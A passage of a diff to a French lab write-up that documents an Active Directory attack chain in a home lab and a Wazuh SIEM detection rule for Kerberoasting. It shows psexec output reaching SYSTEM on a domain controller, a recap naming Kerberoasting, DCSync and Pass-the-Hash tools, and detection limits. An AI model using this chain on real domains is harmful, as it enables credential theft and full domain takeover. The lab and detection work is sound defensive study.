+<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>C:\Windows\system32&gt; whoami
+<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>NT AUTHORITY\SYSTEM
+<a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>
+<a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>C:\Windows\system32&gt; hostname
+<a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>DC01
 </code></pre></div></p>
-<p>✅ <strong>Mot de passe cracké : <code>Ninja2024</code></strong></p>
-<p>Le mot de passe du compte de service est maintenant en clair. L'attaquant peut s'authentifier en tant que <code>svc-http</code> sur n'importe quel service du domaine.</p>
-<h3 id="pourquoi-cette-attaque-est-dangereuse">Pourquoi cette attaque est dangereuse<a class="headerlink" href="#pourquoi-cette-attaque-est-dangereuse" title="Permanent link">&para;</a></h3>
-<ul>
-<li>Elle se fait <strong>100% offline</strong> — aucune connexion suspecte vers le DC après la demande initiale</li>
-<li>Elle ne nécessite <strong>aucun privilège</strong> — un simple compte de domaine suffit</li>
-<li>Les comptes de service ont souvent des <strong>mots de passe anciens</strong> et peu complexes</li>
-<li>En entreprise, ces comptes ont souvent des <strong>droits élevés</strong></li>
-</ul>
+<p>🏆 <strong>NT AUTHORITY\SYSTEM sur DC01 — compromission totale du Domain Controller.</strong></p>
+<hr />
+<h3 id="recapitulatif-de-la-chaine">Récapitulatif de la chaîne<a class="headerlink" href="#recapitulatif-de-la-chaine" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Étape</th>
+<th>Technique</th>
+<th>MITRE</th>
+<th>Outil</th>
+<th>Résultat</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>Kerberoasting</td>
+<td>T1558.003</td>
+<td>Impacket + John</td>
+<td>Hash svc-http cracké</td>
+</tr>
+<tr>
+<td>2</td>
+<td>DCSync</td>
+<td>T1003.006</td>
+<td>secretsdump</td>
+<td>Tous les hashes du domaine</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Pass-the-Hash</td>
+<td>T1550.002</td>
+<td>psexec</td>
+<td>SYSTEM sur DC01</td>
+</tr>
+</tbody>
+</table>
 <hr />
 <h2 id="5-detection-wazuh-siem">5. Détection — Wazuh SIEM <a name="detection"></a><a class="headerlink" href="#5-detection-wazuh-siem" title="Permanent link">&para;</a></h2>
 <h3 id="51-architecture-de-detection">5.1 Architecture de détection<a class="headerlink" href="#51-architecture-de-detection" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>DC01 (Sysmon + Agent Wazuh)
-<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>        │
-<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>        │ logs Event ID 4769
-<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>        ▼
-<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>Wazuh Manager (192.168.10.50)
-<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>        │
-<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>        │ rule.id: 100002
-<a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>        ▼
-<a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>Dashboard Wazuh — Alerte niveau 12
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>DC01 (Sysmon + Agent Wazuh)
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>        │
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>        │ Event ID 4769 (Kerberos TGS Request)
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>        ▼
+<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>Wazuh Manager (192.168.10.50)
+<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>        │
+<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>        │ rule.id: 100002 — RC4 encryption detected
+<a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>        ▼
+<a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>Dashboard Wazuh — Alerte niveau 12
 </code></pre></div>
 <h3 id="52-pourquoi-levent-id-4769">5.2 Pourquoi l'Event ID 4769 ?<a class="headerlink" href="#52-pourquoi-levent-id-4769" title="Permanent link">&para;</a></h3>
-<p>Windows génère un <strong>Event ID 4769</strong> (Kerberos Service Ticket Request) à chaque demande de TGS. Le Kerberoasting se distingue par :</p>
+<p>Windows génère un <strong>Event ID 4769</strong> à chaque demande de TGS. Le Kerberoasting se distingue par :</p>
 <ul>
-<li><strong>TicketEncryptionType = 0x17</strong> → RC4-HMAC, chiffrement faible et facilement crackable</li>
-<li>Un service légitime utilise normalement <strong>AES256 (0x12)</strong> ou <strong>AES128 (0x11)</strong></li>
+<li><strong>TicketEncryptionType = 0x17</strong> → RC4-HMAC, chiffrement faible et crackable</li>
+<li>Un service légitime utilise normalement <strong>AES256 (0x12)</strong></li>
 </ul>
-<blockquote>
-<p><strong>Note :</strong> le champ <code>TicketEncryptionType</code> utilisé par la règle (0x17) est le type de chiffrement Kerberos brut, tel que défini dans la RFC. Le champ <code>ticketEncryptionType</code> qui apparaît dans le tableau d'alerte Wazuh (section 5.4, valeur <code>0x40810010</code>) est différent : c'est un champ Windows composite qui encode le type de chiffrement <strong>avec des flags additionnels</strong> (pré-authentification, renouvellement, etc.). La règle filtre sur le champ brut (<code>0x17</code>), pas sur ce champ composite — d'où la différence de valeur entre les deux.</p>
-</blockquote>
 <h3 id="53-regle-de-detection-custom">5.3 Règle de détection custom<a class="headerlink" href="#53-regle-de-detection-custom" title="Permanent link">&para;</a></h3>
-<p>Fichier : <code>/var/ossec/etc/rules/local_rules.xml</code></p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="nt">&lt;group</span><span class="w"> </span><span class="na">name=</span><span class="s">"kerberoasting,"</span><span class="nt">&gt;</span>
-<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="w">  </span><span class="nt">&lt;rule</span><span class="w"> </span><span class="na">id=</span><span class="s">"100002"</span><span class="w"> </span><span class="na">level=</span><span class="s">"12"</span><span class="nt">&gt;</span>
-<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="w">    </span><span class="nt">&lt;if_group&gt;</span>windows<span class="nt">&lt;/if_group&gt;</span>
-<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="w">    </span><span class="nt">&lt;field</span><span class="w"> </span><span class="na">name=</span><span class="s">"win.system.eventID"</span><span class="nt">&gt;</span>^4769$<span class="nt">&lt;/field&gt;</span>
-<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="w">    </span><span class="nt">&lt;field</span><span class="w"> </span><span class="na">name=</span><span class="s">"win.eventdata.ticketEncryptionType"</span><span class="nt">&gt;</span>^0x17$<span class="nt">&lt;/field&gt;</span>
-<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="w">    </span><span class="nt">&lt;description&gt;</span>Kerberoasting<span class="w"> </span>detecte<span class="w"> </span>-<span class="w"> </span>Demande<span class="w"> </span>de<span class="w"> </span>ticket<span class="w"> </span>RC4<span class="nt">&lt;/description&gt;</span>
-<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="w">    </span><span class="nt">&lt;mitre&gt;</span>
-<a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a><span class="w">      </span><span class="nt">&lt;id&gt;</span>T1558.003<span class="nt">&lt;/id&gt;</span>
-<a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a><span class="w">    </span><span class="nt">&lt;/mitre&gt;</span>
-<a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a><span class="w">  </span><span class="nt">&lt;/rule&gt;</span>
-<a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a><span class="nt">&lt;/group&gt;</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="nt">&lt;group</span><span class="w"> </span><span class="na">name=</span><span class="s">"kerberoasting,"</span><span class="nt">&gt;</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="w">  </span><span class="nt">&lt;rule</span><span class="w"> </span><span class="na">id=</span><span class="s">"100002"</span><span class="w"> </span><span class="na">level=</span><span class="s">"12"</span><span class="nt">&gt;</span>
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="w">    </span><span class="nt">&lt;if_group&gt;</span>windows<span class="nt">&lt;/if_group&gt;</span>
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="w">    </span><span class="nt">&lt;field</span><span class="w"> </span><span class="na">name=</span><span class="s">"win.system.eventID"</span><span class="nt">&gt;</span>^4769$<span class="nt">&lt;/field&gt;</span>
+<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="w">    </span><span class="nt">&lt;field</span><span class="w"> </span><span class="na">name=</span><span class="s">"win.eventdata.ticketEncryptionType"</span><span class="nt">&gt;</span>^0x17$<span class="nt">&lt;/field&gt;</span>
+<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="w">    </span><span class="nt">&lt;description&gt;</span>Kerberoasting<span class="w"> </span>detecte<span class="w"> </span>-<span class="w"> </span>Demande<span class="w"> </span>de<span class="w"> </span>ticket<span class="w"> </span>RC4<span class="nt">&lt;/description&gt;</span>
+<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="w">    </span><span class="nt">&lt;mitre&gt;</span>
+<a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a><span class="w">      </span><span class="nt">&lt;id&gt;</span>T1558.003<span class="nt">&lt;/id&gt;</span>
+<a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a><span class="w">    </span><span class="nt">&lt;/mitre&gt;</span>
+<a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a><span class="w">  </span><span class="nt">&lt;/rule&gt;</span>
+<a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a><span class="nt">&lt;/group&gt;</span>
 </code></pre></div>
-<p><strong>Niveau 12</strong> = alerte haute priorité dans Wazuh.</p>
 <h3 id="54-alerte-dans-le-dashboard">5.4 Alerte dans le dashboard<a class="headerlink" href="#54-alerte-dans-le-dashboard" title="Permanent link">&para;</a></h3>
-<p>Filtre dans Discover : <code>rule.id: 100002</code></p>
-<p><strong>Informations visibles dans l'alerte :</strong></p>
+<p>Filtre : <code>rule.id: 100002</code></p>
 <table>
 <thead>
 <tr>
@@ -2829,17 +2852,17 @@
 <tr>
 <td><code>agent.name</code></td>
 <td>DC01</td>
-<td>Détecté sur le contrôleur de domaine</td>
+<td>Détecté sur le DC</td>
 </tr>
 <tr>
 <td><code>targetUserName</code></td>
 <td>jdoe@LABO.LOCAL</td>
-<td>Compte qui a initié la demande</td>
+<td>Compte initiateur</td>
 </tr>
 <tr>
 <td><code>ipAddress</code></td>
 <td>192.168.10.20</td>
-<td>IP de l'attaquant (Kali)</td>
+<td>IP Kali (attaquant)</td>
 </tr>
 <tr>
 <td><code>ticketEncryptionType</code></td>
@@ -2849,53 +2872,37 @@
 <tr>
 <td><code>rule.level</code></td>
 <td>12</td>
-<td>Alerte haute priorité</td>
+<td>Haute priorité</td>
 </tr>
 </tbody>
 </table>
-<h3 id="55-ce-que-cette-regle-detecte-et-ses-limites">5.5 Ce que cette règle détecte (et ses limites)<a class="headerlink" href="#55-ce-que-cette-regle-detecte-et-ses-limites" title="Permanent link">&para;</a></h3>
-<p><strong>Détecte :</strong>
-- Kerberoasting classique avec Impacket
-- Toute demande de TGS en RC4</p>
-<p><strong>Ne détecte pas :</strong>
-- Kerberoasting AES (attaquant qui force AES256) → nécessite une règle complémentaire
-- Kerberoasting via un compte légitime sur une machine compromise
-- <strong>Faux positif probable</strong> : un service legacy qui ne supporte que RC4 (vieille application, imprimante réseau, etc.) déclenchera cette règle à chaque demande de ticket, sans qu'il s'agisse d'une attaque. En environnement réel, il faut d'abord établir une liste blanche des comptes de service connus pour fonctionner en RC4, avant de pouvoir traiter chaque alerte comme suspecte.</p>
+<h3 id="55-limites-et-ameliorations">5.5 Limites et améliorations<a class="headerlink" href="#55-limites-et-ameliorations" title="Permanent link">&para;</a></h3>
+<p><strong>Détecte :</strong> Kerberoasting RC4 classique avec Impacket.</p>
+<p><strong>Ne détecte pas :</strong> Kerberoasting AES, DCSync, Pass-the-Hash.</p>
 <p><strong>Pour aller plus loin :</strong>
-- Ajouter une règle de corrélation (plusieurs 4769 en peu de temps = scan de SPNs)
-- Activer les alertes par email sur level &gt;= 12</p>
+- Event ID <strong>4742/4738</strong> → DCSync (modification compte machine)
+- Event ID <strong>4624 type 3</strong> depuis IP inconnue → Pass-the-Hash
+- Corrélation : plusieurs 4769 en &lt; 30 secondes = scan de SPNs</p>
 <hr />
-<h3 id="56-comment-sen-proteger">5.6 Comment s'en protéger<a href="#56-comment-sen-proteger">¶</a><a class="headerlink" href="#56-comment-sen-proteger" title="Permanent link">&para;</a></h3>
-<p>La détection ne remplace pas la prévention. Pour réduire la surface d'attaque du Kerberoasting :</p>
-<ul>
-<li><strong>Mots de passe longs et aléatoires</strong> sur les comptes de service (25+ caractères), changés régulièrement — c'est souvent le seul vrai frein, puisque le crackage se fait offline et sans limite de tentatives.</li>
-<li><strong>gMSA (Group Managed Service Accounts)</strong> : Windows gère lui-même un mot de passe de 120 caractères, changé automatiquement tous les 30 jours. Le compte devient pratiquement incrackable.</li>
-<li><strong>Forcer AES</strong> sur les comptes sensibles via l'attribut <code>msDS-SupportedEncryptionTypes</code>, pour désactiver RC4. Attention : certaines applications legacy ne supportent que RC4 et casseraient si on désactive ce chiffrement globalement — il faut tester avant de déployer.</li>
-<li><strong>Limiter les privilèges</strong> des comptes de service au strict nécessaire, pour que même un compte cracké n'ouvre pas la voie à une élévation de privilèges.</li>
-<li><strong>Surveiller en priorité</strong> les comptes à SPN qui sont aussi membres de groupes à privilèges (Domain Admins, Account Operators…) — ce sont les cibles les plus rentables pour un attaquant.</li>
-</ul>
 <h2 id="6-conclusion">6. Conclusion <a name="conclusion"></a><a class="headerlink" href="#6-conclusion" title="Permanent link">&para;</a></h2>
-<p>Ce projet démontre une chaîne d'attaque et de détection complète sur Active Directory :</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>Reconnaissance → Exploitation → Crackage → Détection → Alerte
-<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>(GetUserSPNs)    (TGS request)  (John)      (Event 4769) (Wazuh)
+<p>Ce projet démontre une compromission complète d'un Active Directory de A à Z :</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>User bas → Kerberoasting → DCSync → Pass-the-Hash → SYSTEM sur DC01
 </code></pre></div>
 <h3 id="competences-demontrees">Compétences démontrées<a class="headerlink" href="#competences-demontrees" title="Permanent link">&para;</a></h3>
 <ul>
-<li><strong>Montage d'infrastructure</strong> : AD, DNS, GPO, jonction de domaine</li>
-<li><strong>Pentest AD</strong> : Kerberoasting avec Impacket</li>
-<li><strong>Blue Team</strong> : Règle SIEM custom alignée MITRE ATT&amp;CK</li>
-<li><strong>Scripting</strong> : PowerShell pour la config réseau et AD</li>
-<li><strong>Outils</strong> : VMware, Sysmon, Wazuh, Impacket, John</li>
+<li><strong>Infrastructure</strong> : AD, DNS, Sysmon, jonction de domaine, réseau VMware</li>
+<li><strong>Pentest AD</strong> : Kerberoasting, DCSync, Pass-the-Hash</li>
+<li><strong>Blue Team</strong> : Règle SIEM custom, alignement MITRE ATT&amp;CK</li>
+<li><strong>Outils</strong> : Impacket, John, secretsdump, psexec, netexec, Wazuh</li>
 </ul>
-<h3 id="prochaines-etapes-envisagees">Prochaines étapes envisagées<a class="headerlink" href="#prochaines-etapes-envisagees" title="Permanent link">&para;</a></h3>
+<h3 id="prochaines-etapes">Prochaines étapes<a class="headerlink" href="#prochaines-etapes" title="Permanent link">&para;</a></h3>
 <ul>
-<li>[ ] Pass-the-Hash depuis le compte svc-http cracké</li>
-<li>[ ] BloodHound pour cartographier les chemins d'élévation de privilèges</li>
-<li>[ ] Compromission Domain Admin (DC Sync)</li>
-<li>[ ] Règles de détection pour chaque attaque</li>
+<li>[ ] Golden Ticket avec le hash krbtgt extrait</li>
+<li>[ ] BloodHound CE pour cartographier les chemins d'élévation</li>
+<li>[ ] Règles de détection pour DCSync et Pass-the-Hash</li>
 </ul>
 <hr />
-<p><em>Labo construit et documenté par CryptoGate — <a href="https://github.com/CryptoGate-hub/cyber-writeups">github.com/CryptoGate-hub/cyber-writeups</a></em></p>
+<p><em>Labo construit et documenté par CryptoGate — <a href="https://cryptogate-hub.github.io/cyber-writeups">cyber-writeups</a></em></p>
 
 
 
